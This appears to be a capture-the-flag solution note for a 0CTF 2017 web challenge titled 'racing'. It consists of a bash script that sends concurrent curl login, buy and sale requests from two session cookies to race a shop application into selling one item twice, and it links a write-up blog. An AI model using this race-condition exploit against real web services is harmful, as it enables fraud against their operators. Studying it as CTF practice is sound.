# racing

```bash
username=
password=
cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
url="http://202.120.7.197/app.php"

curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &\
curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"

curl "$url?action=buy&id=1" -b $cookie1

curl "$url?action=sale&id=1" -b $cookie1 &\
curl "$url?action=sale&id=1" -b $cookie2
```

https://www.40huo.cn/blog/0ctf-2017-writeup.html
